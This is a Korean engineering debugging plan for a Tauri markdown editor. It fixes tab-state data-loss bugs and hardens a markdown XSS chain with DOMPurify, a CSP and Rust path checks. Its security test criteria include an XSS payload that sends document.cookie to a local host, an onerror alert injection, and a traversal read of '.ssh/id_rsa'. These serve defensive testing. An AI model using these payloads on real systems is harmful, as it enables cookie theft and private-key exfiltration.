# DEBUG_PLAN.md — P0 Critical 결함 해소 실행 계획

> **대상**: `project/` (Devoras Design, package.json `0.8.3` / code_review 기준 `v0.8.2`)
> **입력 문서**: `code_review.md`(P0-1 ~ P0-6), `advanced_rendering_optimization.md`, `architecture_stages.md`, `implementation_plan.md` §전체 개요
> **형식**: [파일 & 라인] ➔ [근본 원인] ➔ [Interface] ➔ [Data Flow] ➔ [Core Logic] ➔ [Edge Cases & Guards] ➔ [DoD]
> **버전 표기 불일치**: 리뷰는 `v0.8.2` 기준, 현 코드는 `0.8.3`. 아래 라인 번호는 현 코드 기준으로 재확인 완료.

---

## 0. 실행 순서 & 게이트

| # | Batch | 항목 | 유형 | 난이도 | 선행 |
|---|---|---|---|---|---|
| 0 | **B0 공통 인프라** | `useDebouncedCallback`, `blockStoreOwnerTabId`, `updateContentForTab`, `_snapshotActiveTab` | 인프라 | 중간 | — |
| 1 | **B1 데이터 안전성** | P0-2 `openTab` 편집 소실 | 데이터 로스 | 쉬움 | B0 |
| 2 | B1 | P0-4 디바운스 타이머 교차 오염 | 데이터 로스 | 쉬움 | B0 |
| 3 | B1 | P0-6 드래그 재정렬 문서 손상 | 데이터 로스 | 중간 | — |
| 4 | B1 | P0-5 dirty 탭 무경고 파괴 | 데이터 로스 | 쉬움 | — |
| 5 | **B2 보안** | P0-1 마크다운 XSS → 홈 디렉터리 접근 | 보안 | 중간 | — |
| 6 | **B3 구조** | P0-3 분할 패널 전역 상태 공유 | 구조 결함 | 높음 | B0·B1 |

**게이트 규칙**
- B1 미완료 상태에서 `implementation_plan` **Sprint 3(렌더링/메모리 최적화)** 착수 금지. P0-4는 `advanced_rendering_optimization` §3.1 TTL 언마운트 도입 시 **모든 탭에서 대규모 재현**된다.
- P0-3은 **단독 패치 금지**. Sprint 3의 탭 스코프 스토어 개편 + `advanced_rendering_optimization` **Phase 1(상태 스냅샷)** 과 동일 지점을 건드리므로 병합 진행(§7).
- P0-1은 **외부 `.md` 공유/배포 이전 필수**. 앱 경계를 넘는 유일한 결함.

---

## 1. B0 — 공통 인프라 (선행 필수)

### 1.1 근본 전제 (모든 P0의 공통 뿌리)

markdown 탭의 **최신 본문 SSOT는 `useBlockStore.getMergedContent()`** 이며, `useDocumentStore.rawContent`는 **최대 150ms 지연된 복제본**이다. 현재 코드의 모든 스냅샷/저장/탭 전환 경로가 지연 복제본을 읽고 있어 P0-2·P0-4가 발생한다. 동시에 `blockStore`는 **전역 싱글톤**이므로 "지금 이 blockStore가 어느 탭의 것인가"를 판별할 수 없다 — 이것이 P0-3·P0-4 교차 오염의 물리적 원인이다.

→ **소유권 태그(`ownerTabId`) 도입**을 모든 수정의 0순위로 둔다.

### 1.2 Interface & Types

```typescript
// src/shared/lib/useDebouncedCallback.ts (신규)
export interface DebouncedHandle<A extends unknown[]> {
  (...args: A): void;
  flush: () => void;    // 대기 중이면 즉시 실행 후 타이머 해제
  cancel: () => void;   // 실행 없이 타이머만 해제
  isPending: () => boolean;
}
export function useDebouncedCallback<A extends unknown[]>(
  fn: (...args: A) => void,
  delayMs: number,
): DebouncedHandle<A>;
```

```typescript
// src/entities/block/model/store.ts (변경)
interface BlockState {
  blocks: EditorBlock[];
  ownerTabId: string | null;                                   // ← 신규
  setBlocksFromContent: (content: string, ownerTabId?: string) => void;  // ← 시그니처 확장
  // ... 기존 동일
}
```

```typescript
// src/entities/document/model/store.ts (변경)
interface DocumentState {
  _snapshotActiveTab: () => SplitPane[];                       // ← 신규(순수: set 미수행, 갱신된 panes 반환)
  updateContentForTab: (tabId: string, content: string) => void; // ← 신규
  saveFile: (paneId?: string, tabId?: string) => Promise<void>;  // ← 시그니처 확장(기본값 = 활성)
  // ... 기존 동일
}
```

### 1.3 Core Logic

**`useDebouncedCallback`**
- Step 1: `timerRef`, `argsRef`에 최신 인자 보관. 호출 시 기존 타이머 `clearTimeout` 후 재예약.
- Step 2: `flush()` = 타이머 존재 시 `clearTimeout` → `fnRef.current(...argsRef.current)` → ref 초기화.
- Step 3: `useEffect(() => () => { /* cancel only */ }, [])` — **flush는 훅 내부에서 자동 수행하지 않는다.** 언마운트 시 무엇을 flush할지는 호출부의 소유권 판단이 필요하기 때문(P0-4 참조).
- Step 4: `fnRef`를 매 렌더 갱신하여 stale closure 차단.

**`setBlocksFromContent(content, ownerTabId?)`**
- 기존 로직 유지 + `set({ blocks: treeBlocks, ownerTabId: ownerTabId ?? get().ownerTabId })`.

**`_snapshotActiveTab()`**
- Step 1: `activePane`·`activeTab` 조회. 없으면 현재 `panes` 그대로 반환.
- Step 2: 본문 결정
  - `activeTab.type === 'markdown'` **그리고** `blockStore.ownerTabId === activeTab.id` → `blockStore.getMergedContent()`
  - 그 외(erd / mindmap-global / 소유자 불일치) → `get().rawContent`
- Step 3: 해당 탭의 `cache = { rawContent: 본문, nodes, spatialData }`, `isDirty` 반영한 새 `panes` 배열 반환.

**`updateContentForTab(tabId, content)`**
- Step 1: 전 패널을 순회해 `tabId` 보유 탭 탐색. 없으면 **무시하고 return**(스테일 타이머 방어).
- Step 2: 그 탭이 **활성 패널의 활성 탭**이면 `set({ rawContent: content, isDirty: true })` + 탭 `isDirty=true`.
- Step 3: 아니면 **전역 `rawContent`를 건드리지 않고** 해당 탭의 `cache.rawContent`만 갱신 + `isDirty=true`.

### 1.4 Edge Cases & Guards
- `getMergedContent()`가 `''` (blockStore 초기화 직후)인데 `ownerTabId`가 일치하는 경우 → 실제 빈 문서와 구분 불가. **가드**: `setBlocksFromContent`가 최소 1개 빈 블록을 항상 만들므로 `blocks.length === 0`일 때만 스냅샷을 skip.
- `ownerTabId`는 `setBlocksFromContent` 호출부에서만 지정. 미지정 호출(부분 갱신)은 소유권을 변경하지 않는다.
- `_snapshotActiveTab`은 **부수효과 없음**. 호출자가 반환된 `panes`를 자신의 `set()`에 병합해야 하며, 중간에 다른 `set()`을 끼워 넣으면 lost-update 발생.

### 1.5 DoD
- `pnpm lint` + `tsc` 통과.
- 유닛 테스트(Vitest): `useDebouncedCallback` flush/cancel/pending 3케이스, `updateContentForTab` 비활성 탭 분기 1케이스.

---

## 2. P0-2 — `openTab`이 `TabCache`를 우회하여 미저장 편집 소실

**[파일 & 라인]**
`src/entities/document/model/store.ts:113-204` (특히 155·177-201)
`src/widgets/FileExplorer/ui/FileExplorer.tsx:212-222`

**[근본 원인]**
캐시 백업은 `setActiveTab`의 Step 1(라인 208-227)에만 존재한다. `openTab`은 무조건 `readFile()` 후 `set({ rawContent: content, isDirty: false })`로 덮어쓰며 **떠나는 탭을 캐시에 저장하지 않는다.** 또한 이미 열린 탭이어도 캐시를 무시하고 디스크를 재독취한다. `FileExplorer.tsx:212`의 `currentFile?.path !== file.path` 조건 때문에 **현재 dirty 파일을 재클릭하면 경고 없이 디스크 내용으로 롤백**된다.

**[Data Flow]**
`FileExplorer.handleFileSelect → documentStore.loadFile → openTab → (_snapshotActiveTab) → cache 복원 | readFile → set`

**[Core Logic]**
```typescript
// store.ts — 모듈 스코프
let openSeq = 0;

openTab: async (item) => {
  const panesWithSnapshot = get()._snapshotActiveTab();   // Step 1: 떠나는 탭 보존
  const activePane = panesWithSnapshot.find(p => p.id === get().activePaneId) ?? panesWithSnapshot[0];
  const file = item as FileEntry;
  const tabId = file.path;
  const existingTab = activePane.tabs.find(t => t.id === tabId);

  if (existingTab?.cache) {                               // Step 2: 캐시 우선 복원 (디스크 I/O 0)
    set({
      panes: panesWithSnapshot.map(p => p.id === activePane.id ? { ...p, activeTabId: tabId } : p),
      rawContent: existingTab.cache.rawContent,
      nodes: existingTab.cache.nodes,
      spatialData: existingTab.cache.spatialData,
      isDirty: existingTab.isDirty ?? false,
      viewMode: get().viewMode,
    });
    return;
  }

  const token = ++openSeq;                                // Step 3: 경합 토큰
  const content = await fileSystemRepository.readFile(file.path);
  const allMetadata = await fileSystemRepository.readSpatialMetadata(workspacePath);
  if (token !== openSeq) return;                          // Step 4: 스테일 응답 폐기
  // Step 5: 기존 set() — 단, base는 panes가 아니라 panesWithSnapshot
}
```

**[Edge Cases & Guards]**
- **비동기 경합**: 파일 A·B 연속 클릭 시 A의 `readFile`이 나중에 resolve되면 B 탭에 A 내용이 기록된다. `openSeq` 토큰으로 폐기(Step 4). `readSpatialMetadata` 이후에도 재검사.
- **`set` base 오염**: `readFile` await 이후 `get().panes`를 다시 읽으면 스냅샷이 유실된다. 반드시 `panesWithSnapshot`을 base로 병합하되, await 사이에 탭이 닫혔을 수 있으므로 `tabId` 존재 여부 재확인.
- **`viewMode` 강제 초기화 제거**: 현재 `openTab`은 항상 `viewMode:'write'`로 되돌린다. Read 모드에서 파일을 바꾸면 모드가 튄다 → 유지하도록 변경.
- **`FileExplorer.tsx:212-215`**: 캐시 보존이 보장되므로 `window.confirm`을 **제거**한다(경고 없이 롤백되던 버그 자체가 소멸). 단, P0-5의 닫기 가드는 별도 유지.
- **`FileExplorer.tsx:219-222`**: `setBlocksFromContent(freshContent)` 중복 호출 제거. `BlockEditor`의 `useLayoutEffect`(BlockEditor.tsx:364-369)가 단일 소유자이며, 여기서 `ownerTabId`를 함께 주입한다. 첫 블록 포커스도 같은 effect로 이동.
- ERD 탭(`.erd`)은 `parseMarkdown`을 타지 않으므로 `nodes: []` 유지 — 캐시 복원 시에도 동일.

**[DoD]**
1. A(수정 후 저장 안 함) → B 열기 → A 재클릭 → **수정본 유지 + dirty 유지**.
2. dirty 상태 A를 탐색기에서 재클릭 → 롤백/경고 모두 발생하지 않음.
3. A·B 초고속 연속 클릭 20회 → 최종 표시 문서와 활성 탭 제목 일치.

---

## 3. P0-4 — 150ms 동기화 타이머 미정리 → 문서 간 교차 오염

**[파일 & 라인]** `src/widgets/BlockEditor/ui/BlockEditor.tsx:361, 470-476, 479-484`

**[근본 원인]**
`contentSyncTimerRef`는 **다음 키 입력 시에만** 해제된다. `<BlockEditor key={activeTab.id}>`(WorkspacePage.tsx:353)는 탭 전환마다 언마운트되므로, 전환 직전 150ms 내 예약된 타이머가 **새 문서 컨텍스트에서** `updateContent(getMergedContent())`를 실행한다. `handleMerge`의 `setTimeout(..., 0)`(라인 481)도 동일 계열.

> **리뷰 원안의 한계**: cleanup에서 `updateContent()`를 flush하면, 그 시점 `documentStore.rawContent`는 **이미 새 탭의 내용**이므로 오염 방향만 바뀔 뿐 해소되지 않는다. 반드시 **소유자 탭을 지정해 쓰는** `updateContentForTab`으로 flush해야 한다.

**[Data Flow]**
`CodeMirror onUpdate → handleBlockUpdate → syncContent(debounced 150ms) → documentStore.updateContentForTab(ownerTabId, merged)`

**[Core Logic]**
```typescript
const ownerTabIdRef = useRef<string>(currentFile?.path ?? '');

const syncContent = useDebouncedCallback(() => {
  const bs = useBlockStore.getState();
  if (bs.ownerTabId !== ownerTabIdRef.current) return;              // 소유권 가드
  useDocumentStore.getState().updateContentForTab(ownerTabIdRef.current, bs.getMergedContent());
}, 150);

// 언마운트: flush-then-cancel (소유권이 유효할 때만)
useEffect(() => () => { syncContent.flush(); }, []);

// handleMerge: setTimeout(0) 제거 → 동기 호출
const handleMerge = (id: string) => {
  mergeBlockWithPrevious(id);
  syncContent();      // 디바운스 경로로 일원화
};
```
- `handleBlockUpdate`의 `else` 분기(라인 470-476)를 `syncContent()` 호출로 치환하고 `contentSyncTimerRef`를 삭제.
- 헤딩 개수 변경 분기(라인 468)의 즉시 `updateContent(merged)`도 `updateContentForTab(ownerTabIdRef.current, merged)`로 교체.

**[Edge Cases & Guards]**
- **`saveFile` 진입 시 flush 누락**: `Cmd+S`는 `WorkspacePage`에서 발화하고 `saveFile`은 `blockStore.getMergedContent()`를 직접 읽으므로 데이터 손실은 없다. 다만 `rawContent`가 뒤처진 상태로 `isDirty` 계산에 쓰이므로, `saveFile` 첫 줄에서 `updateContentForTab`을 동기 호출해 정합성을 맞춘다.
- **cleanup 실행 순서**: React는 key 변경 시 (이전 cleanup) → (신규 setup) 순서를 보장하지만, `documentStore.set()`은 이미 렌더 이전에 완료돼 있다. 따라서 `ownerTabId` 가드 없이는 여전히 오염된다 — 가드는 **선택이 아니라 필수**.
- **StrictMode 이중 마운트**: cleanup이 즉시 1회 더 실행되어 빈 flush가 발생 → `isPending()` false면 no-op이므로 무해함을 테스트로 고정.
- **IME 조합 중 언마운트**: `view.composing`이 true인 상태의 마지막 조합 문자는 CodeMirror가 이미 doc에 반영했으므로 flush로 보존된다. 조합 중 탭 전환 회귀 테스트 필수.

**[DoD]**
1. A에서 타이핑 직후 **150ms 내** B 탭으로 전환 → B가 dirty로 표시되지 않고, A의 타이핑이 A 캐시에 보존.
2. 블록 병합(Backspace) 직후 즉시 탭 전환 → 병합 결과가 A에만 반영.

---

## 4. P0-6 — Read 모드 드래그 재정렬이 자식 블록을 고아로 만들고 즉시 디스크 저장

**[파일 & 라인]**
`src/entities/block/model/store.ts:232-242` (`reorderBlocks`)
`src/widgets/BlockEditor/ui/ReadView.tsx:314-330` (`handleDrop`)

**[근본 원인]**
`reorderBlocks`는 `flattenTree`의 **평면 인덱스 1개**만 splice한다. 헤딩 노드와 `children`은 평면 리스트에서 별개 항목이므로 H2 카드를 드래그하면 **헤딩 한 줄만 이동**하고 본문·하위 섹션은 제자리에 남아 직전 헤딩의 하위로 재편입된다. 이어서 `handleDrop`이 `await saveFile()`(라인 326)로 **뒤엉킨 문서를 즉시 디스크에 확정**하며 되돌릴 수단이 없다. `findIndex`가 `-1`이면 `splice(-1,1)`이 되어 엉뚱한 요소 제거 또는 `undefined` 삽입 → 후속 `.content` 접근에서 크래시.

**[Interface]** 시그니처 불변: `reorderBlocks(fromIndex: number, toIndex: number): void`. **의미 재정의**: 인덱스는 `flattenTree` DFS preorder 기준이며, 이동 단위는 **노드 + 전체 서브트리**다.

**[Core Logic]**
```typescript
reorderBlocks: (fromIndex, toIndex) => {
  const flat = flattenTree(get().blocks);
  if (fromIndex < 0 || fromIndex >= flat.length) return;          // Step 1: 경계
  if (toIndex   < 0 || toIndex   >= flat.length) return;
  if (fromIndex === toIndex) return;

  const node   = flat[fromIndex];
  const group  = [node, ...flattenTree(node.children)];           // Step 2: 서브트리 통째로
  const target = flat[toIndex];
  if (group.includes(target)) return;                             // Step 3: 자기 자손에 드롭 금지

  const rest = flat.filter(b => !group.includes(b));
  let insertAt = rest.indexOf(target);
  if (insertAt < 0) return;
  if (toIndex > fromIndex) {                                      // Step 4: 아래로 이동 → target 서브트리 "뒤"
    insertAt += 1 + flattenTree(target.children).length;
  }
  rest.splice(insertAt, 0, ...group);

  get().setBlocksFromContent(rest.map(b => b.content).join('\n'), get().ownerTabId ?? undefined);
},
```

**[Edge Cases & Guards]**
- **DFS preorder 연속성**: `flattenTree`가 preorder이므로 `group`은 원본 평면 리스트에서 연속 구간이다. `filter`의 참조 동일성(`includes`)이 성립하는 것은 `flattenTree`가 **동일 객체 참조**를 반환하기 때문 — 이 전제가 깨지면(향후 immer 도입 등) 즉시 결함이 된다. 주석으로 명시.
- **Step 4가 없으면 문서 손상**: 아래로 이동 시 target 헤딩과 그 children 사이에 끼워 넣으면, 재빌드 과정에서 **target의 원래 children이 이동한 헤딩의 자식으로 재편입**된다. 방향 판정은 필수.
- **level 0 텍스트 블록**: `children`이 없어 `group.length === 1` — 기존 동작과 동일.
- **join 구분자**: `getMergedContent`(store.ts:174)와 동일하게 `'\n'` 사용. `'\n\n'`으로 바꾸면 저장 시 문서에 빈 줄이 누적된다.
- **`handleDrop` 자동 저장 제거**: `await saveFile()` 삭제 → `setDirty(true)`만 남기고 `Cmd+S`로 확정. `updateContent(merged)`는 `updateContentForTab(activeTabId, merged)`로 교체.
- **`toIdx === -1` 방어**: `handleDrop`(ReadView.tsx:316-317)에 이미 존재하나, `draggedIdx`가 stale(드래그 중 문서가 재파싱되어 인덱스 무효)일 수 있으므로 `reorderBlocks` 내부 경계 검사를 최종 방어선으로 유지.

**[DoD]**
1. 본문 2개 + H3 하위 섹션을 가진 H2를 다른 H2 **위/아래**로 각각 드래그 → 서브트리가 통째로 이동하고 다른 섹션 구조 불변.
2. 드롭 직후 디스크 파일 mtime 불변, 탭에 dirty 표시.
3. H2를 자기 자신의 H3 위로 드롭 → 무동작(크래시·문서 변형 없음).

---

## 5. P0-5 — `closeTab` / `Cmd+W`가 dirty 탭을 경고 없이 파괴

**[파일 & 라인]**
`src/entities/document/model/store.ts:293-320`(`closeTab`), `407-426`(`handleFileDeleted`)
`src/pages/WorkspacePage/WorkspacePage.tsx:57-65`(Cmd+W), 탭 `X` 버튼

**[근본 원인]**
`closeTab`은 가드 없이 탭을 배열에서 제거하며 `cache`·`isDirty`를 함께 폐기한다. `Cmd+W`, 탭 `X`, `handleFileDeleted`가 모두 이 액션에 직결. 앱 종료 시에도 전원 소실.

**[설계 원칙]** 스토어는 **부수효과 없는 순수 액션**으로 유지하고, 가드는 **UI 경계에만** 배치한다(Humble Object).

**[Interface]**
```typescript
// src/pages/WorkspacePage/lib/confirmClose.ts (신규)
export async function confirmDiscardIfDirty(tab: TabItem | undefined): Promise<boolean>;
// true = 진행 가능. 내부적으로 @tauri-apps/plugin-dialog 의 ask() 사용
export function hasDirtyTabs(panes: SplitPane[]): boolean;
```

**[Core Logic]**
- Step 1: `Cmd+W` 핸들러 / 탭 `X` `onClick` → `await confirmDiscardIfDirty(tab)`가 false면 return, true면 `closeTab(paneId, tabId)`.
- Step 2: 앱 종료 — `App` 마운트 시 `getCurrentWindow().onCloseRequested(async (e) => { if (!hasDirtyTabs(panes)) return; e.preventDefault(); if (await ask(...)) await getCurrentWindow().destroy(); })`.
- Step 3: `handleFileDeleted`가 호출하는 `closeTab`은 **가드를 적용하지 않는다**(원본 파일이 이미 없음).

**[Edge Cases & Guards]**
- `window.confirm`은 WebView를 블로킹하며 `onCloseRequested` 콜백 내부에서 플랫폼별로 불안정 → **`plugin-dialog`의 `ask()`** 사용(`dialog:allow-ask` 권한 확인 필요. 현 capabilities에는 `dialog:default`만 존재 → 누락 시 추가).
- `getCurrentWindow().destroy()` 호출을 위해 `core:window:allow-destroy` 권한 필요 여부 확인.
- **Cmd+W 중복 발화**: 확인 다이얼로그가 열린 동안 키 반복으로 재진입 가능 → `isClosingRef` 플래그로 잠금.
- **IME 조합 중**: `if (e.isComposing) return;`을 `handleKeyDown` 최상단에 추가(현재 Cmd+S/Cmd+W 모두 미적용).
- **`executeSave` stale closure**: `useEffect` 의존성이 `[saveFile, openWorkspace]`인데 `executeSave`는 매 렌더 재생성 — 현 구조에서 동작하나, Cmd+W 가드 추가 시 `panes`를 클로저로 잡으면 stale이 된다. **가드 내부에서 `useDocumentStore.getState()`로 최신 상태를 읽을 것.**
- 마지막 탭을 닫아 패널이 GC될 때(store.ts:315-317)도 가드가 선행되어야 한다.

**[DoD]**
1. dirty 탭에서 `Cmd+W` → 확인 다이얼로그. 취소 시 탭 유지 + 내용 유지.
2. dirty 탭 보유 상태에서 윈도우 닫기 → 확인 다이얼로그, 취소 시 앱 유지.
3. 탐색기에서 파일 삭제 → 다이얼로그 없이 해당 탭만 정리.

---

## 6. P0-1 — 신뢰할 수 없는 마크다운 → 임의 코드 실행 + 홈 디렉터리 전체 접근

**[파일 & 라인]**
`src/widgets/BlockEditor/ui/ReadView.tsx:16, 35, 41, 43, 97-100, 450-452`
`src-tauri/tauri.conf.json:38-46` · `src-tauri/src/lib.rs:11-28, 30-54` · `src-tauri/capabilities/default.json`

**[근본 원인 — 4단 공격 체인]**
1. 새니타이저 부재: `package.json`에 `dompurify` 없음. `preprocessMd`가 `==...==`를 raw `<mark>`로 주입하고, 코드 펜스의 `|title|="..."`(라인 41)은 **이스케이프 없이** 보간되며 결과가 `dangerouslySetInnerHTML`(라인 450-452)로 삽입.
2. `tauri.conf.json:40` `"csp": null` → `<img src=x onerror=...>` 등 인라인 핸들러 실행 가능.
3. `save_image_file`(lib.rs:12) / `read_image_base64`(lib.rs:32)가 `String` 경로를 **무검증**으로 `std::fs`에 전달(주석에 plugin-fs scope 우회가 의도적으로 명시됨).
4. `capabilities/default.json`의 home/desktop/document/download **재귀 read/write 8건** + `shell:allow-open` + `assetProtocol.scope: ["**"]`.

**[Core Logic — 4개 레이어 동시 차단]**

**L1. 출력 새니타이즈 (ReadView.tsx)**
```typescript
// Step 1: & 를 최우선 치환하는 단일 헬퍼로 통일 (라인 35 safeText, 라인 41 title)
const escapeHtml = (s: string) =>
  s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
   .replace(/</g, '&lt;').replace(/>/g, '&gt;');

// Step 2: 렌더 최종단에서 sanitize
function renderBlockToHtml(content: string, workspacePath: string | null): string {
  const html = markedParser.parse(preprocessMd(content)) as string;
  return DOMPurify.sanitize(resolveAssetPaths(html, workspacePath), {
    USE_PROFILES: { html: true, mathMl: true, svg: true },   // katex 의존성 존재
    ADD_ATTR: ['data-src', 'data-code'],
  });
}
```
설치: `pnpm add dompurify && pnpm add -D @types/dompurify`

**L2. CSP (tauri.conf.json)**
```json
"security": {
  "csp": "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self'; connect-src 'self' ipc: http://ipc.localhost",
  "devCsp": "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self' 'unsafe-inline'; connect-src 'self' ipc: http://ipc.localhost ws://localhost:1420 http://localhost:1420",
  "assetProtocol": { "enable": true, "scope": [] }
}
```

**L3. Rust 경로 검증 (lib.rs)**
```rust
// 워크스페이스 루트는 "JS 인자"가 아니라 Rust 상태에서 읽는다 (XSS는 invoke 인자를 위조할 수 있음)
struct WorkspaceRoot(std::sync::Mutex<Option<std::path::PathBuf>>);

#[tauri::command]
fn devoras_workspace_set_root(app: tauri::AppHandle, state: tauri::State<WorkspaceRoot>, path: String) -> Result<(), String>;
// ↑ 폴더 선택 다이얼로그 성공 직후에만 호출. fs/asset 런타임 스코프 허용도 여기서 수행.

fn ensure_inside(root: &std::path::Path, path: &str) -> Result<std::path::PathBuf, String> {
    let target = std::path::Path::new(path);
    let probe = if target.exists() { target } else { target.parent().unwrap_or(target) };
    let probe = std::fs::canonicalize(probe).map_err(|e| e.to_string())?;
    let root  = std::fs::canonicalize(root).map_err(|e| e.to_string())?;
    if !probe.starts_with(&root) { return Err("워크스페이스 외부 경로 접근이 거부되었습니다".into()); }
    Ok(target.to_path_buf())
}
```
- `save_image_file` → `devoras_image_save`, `read_image_base64` → `devoras_image_read_base64`로 개명(`architecture_stages` Stage 1 `devoras_{domain}_{action}` 컨벤션).
- 두 커맨드 모두 진입부에서 `ensure_inside(state_root, &path)?` 통과 후에만 `std::fs` 접근.

**L4. 권한 최소화 (capabilities/default.json)**
- 제거: `fs:allow-home-*-recursive`, `fs:allow-desktop-*-recursive`, `fs:allow-document-*-recursive`, `fs:allow-download-*-recursive` (8건), `shell:allow-open`.
- 대체: 워크스페이스 선택 시 런타임 동적 허용 — `tauri_plugin_fs::FsExt::fs_scope(&app).allow_directory(&root, true)` + `app.asset_protocol_scope().allow_directory(&root, true)`.
  > ⚠️ **검증 필요**: Tauri 2.11 기준 위 두 API 명칭/가용성을 PoC로 먼저 확인. 불가 시 차선책은 `scope: ["$HOME/**"]` 유지 + L3 Rust 검증에 의존(보안 강도 하락 명시).

**[Edge Cases & Guards]**
- **dev 모드 붕괴**: `csp`만 지정하고 `devCsp`를 누락하면 Vite HMR(ws://localhost:1420)이 차단되어 `pnpm tauri dev`가 죽는다. 두 값을 함께 설정.
- **`style-src 'unsafe-inline'` 필수**: Tailwind 런타임 인라인 style·`maxWidthStyle`(ReadView.tsx:338)이 있어 제거 시 레이아웃 붕괴.
- **`img-src data:` 필수**: `resolveAssetPaths`가 초기 src로 투명 GIF data URL을 넣는다(ReadView.tsx:92).
- **`data-code` 소실 위험**: DOMPurify는 기본적으로 `data-*`를 허용하지만(`ALLOW_DATA_ATTR` 기본 true), 복사 버튼 동작이 여기에 의존하므로 `ADD_ATTR` 명시 + 회귀 테스트.
- **hljs 클래스 유지**: `class="hljs language-*"`가 sanitize 후에도 남는지 확인(허용 속성).
- **성능**: `renderBlockToHtml`은 렌더마다 재실행(P2-3)되며 sanitize가 비용을 배가한다. **P2-3(파싱 결과 Map 캐시)와 동일 커밋에서 처리 권장** — 키는 `hash(content + workspacePath)`.
- **P1-8 연계**: `read_image_base64`(≈1.37배 팽창)를 `convertFileSrc` 기반으로 교체하면 L2의 `img-src asset:`와 L4 런타임 스코프가 그대로 재사용된다. `advanced_rendering_optimization` §5 최대 단일 할당원 제거와 **동일 작업 묶음**.

**[DoD]**
1. 페이로드 `![x](x" onerror="fetch('http://127.0.0.1:9/'+document.cookie))` 및 ```` ```js |title|="<img src=x onerror=alert(1)>" ```` 포함 `.md`를 Read 모드로 열어 **네트워크 요청 0건 / 콘솔 CSP 차단 로그 확인**.
2. 워크스페이스 밖 경로(`../../../.ssh/id_rsa`)로 `devoras_image_read_base64` 직접 invoke → `Err` 반환.
3. `pnpm tauri dev` 정상 기동(HMR 동작), `pnpm tauri build` 후 이미지·코드블록 복사 버튼 정상.

---

## 7. P0-3 — 분할 패널이 전역 상태 하나를 공유 (구조 결함)

**[파일 & 라인]**
`src/pages/WorkspacePage/WorkspacePage.tsx:353` · `src/widgets/BlockEditor/ui/BlockEditor.tsx:338-345` · `src/entities/document/model/store.ts:477-520`(`saveFile`)

**[근본 원인]**
각 `PaneContainer`가 독립적으로 `<BlockEditor>`를 마운트하지만, 모든 인스턴스가 파일은 `getCurrentFile()`(= **활성 패널**의 탭)에서, 내용은 전역 `blockStore.blocks` / `documentStore.rawContent`에서 읽는다. 결과적으로 패널마다 `activeTabId`가 달라도 **같은 문서**가 그려진다. `saveFile()`은 저장 **경로**를 활성 탭에서, 저장 **내용**을 전역 `blockStore.getMergedContent()`에서 가져오므로, 둘이 어긋나는 순간 **A 파일에 B 본문이 기록**된다.

### 7.1 Stage A — 즉시 적용 안전판 (≤1일, B1과 함께 배포)

목적: 구조 개편 전까지 **데이터 손상만 확실히 차단**한다.

- **A-1. 저장 원자성**: `saveFile(paneId?, tabId?)`. 내부에서 대상 탭을 명시적으로 해석하고, `tabId !== blockStore.ownerTabId`이면 `blockStore` 대신 **해당 탭의 `cache.rawContent`** 를 기록한다. 활성 탭이면 `getMergedContent()`.
- **A-2. 편집자 단일화**: `PaneContainer`가 `<BlockEditor tab={activeTab} isActivePane={pane.id === activePaneId} />`를 주입하고, **비활성 패널은 `readOnly` 렌더**(내용은 `tab.cache?.rawContent ?? ''`). 전역 `blockStore`를 편집하는 인스턴스를 상시 1개로 제한한다.
- **A-3. 소유권 가드**: B0의 `ownerTabId`로 잘못된 소유자의 쓰기를 전면 차단.

**[Edge Cases & Guards]**
- 패널 포커스 전환(`setActivePane`) 시 이전 활성 패널의 편집을 먼저 스냅샷(`_snapshotActiveTab`) 후 새 패널의 blockStore 소유권을 이전.
- 동일 파일을 두 패널에 열었을 때(`tabId` 중복) — 캐시가 탭 단위이므로 두 사본이 갈라진다. Stage A에서는 **동일 파일 중복 오픈 시 기존 패널로 포커스 이동**으로 회피하고, Stage B에서 문서 단위 공유 모델로 해결.
- `<BlockEditor key={activeTab.id}>`는 패널 간 동일 파일에서 key가 겹치나 트리가 분리돼 있어 충돌 없음. Stage B에서 `key={`${pane.id}:${tab.id}`}`로 명시화.

### 7.2 Stage B — 탭 스코프 스토어 (Sprint 3 / Phase 1 병합 진행)

> `advanced_rendering_optimization` §4 **의존성 주의**: Phase 1(상태 스냅샷)과 P0-3은 동일 지점을 건드리므로 **분리 진행 시 스냅샷 인터페이스를 두 번 설계**하게 된다.

```typescript
// src/entities/document/model/tabStore.ts (신규)
export interface TabViewState {          // Phase 1 스냅샷 대상 = 그대로 직렬화 가능한 Plain Object
  scrollTop: number; zoom: number; selection: string | null; camera?: [number, number, number];
}
export interface TabStore {
  rawContent: string; blocks: EditorBlock[]; nodes: MindNode[];
  spatialData: Record<string, { x: number; y: number }>;
  isDirty: boolean; viewMode: 'write' | 'read';
  view: TabViewState;
  serialize: () => string;               // Phase 2 TTL 언마운터가 재사용
  hydrate: (json: string) => void;
}
export function createTabStore(tabId: string): StoreApi<TabStore>;

// React Context
export const TabScopeContext = React.createContext<StoreApi<TabStore> | null>(null);
export function useTabStore<T>(selector: (s: TabStore) => T): T;
```

**[Data Flow]**
`PaneContainer(create/destroy) → TabScopeContext → BlockEditor / ReadView / MindView (useTabStore selector)`
`documentStore`는 **panes/tabs 메타데이터만** 소유 (`architecture_stages` 공통 주의사항 2: 원본 데이터는 Rust/디스크 소유).

**[Core Logic]**
- Step 1: `PaneContainer`에서 `activeTab.id`별 `createTabStore` 생성, 탭 언마운트 시 파기 → 상태 자연 소멸(= Phase 1 목표 달성).
- Step 2: 전역 `blockStore`/`documentStore.rawContent`/`nodes`/`isDirty`/`viewMode` 참조를 selector 호출로 치환. 크로스 레이어 `getState()` 직접 호출 제거(리뷰 Critical-5).
- Step 3: `saveFile(paneId, tabId)`는 해당 tabStore에서만 내용을 읽는다.
- Step 4: `serialize()/hydrate()`를 Phase 2 TTL 언마운터의 계약으로 확정.

**[DoD]**
1. 좌/우 패널에 서로 다른 문서를 열고 각각 편집 → 화면·탭 제목·저장 결과 3자 일치.
2. 좌측에서 저장 시 우측 문서 내용이 좌측 파일에 기록되지 않음(현 결함 회귀 테스트).
3. 탭 닫기 후 `blocks`/`nodes` 참조가 해제됨(DevTools 힙 스냅샷으로 확인) — `advanced_rendering_optimization` P1-3과 동일 축.

---

## 8. 회귀 검증 시나리오 (수동 QA 체크리스트)

| # | 시나리오 | 기대 |
|---|---|---|
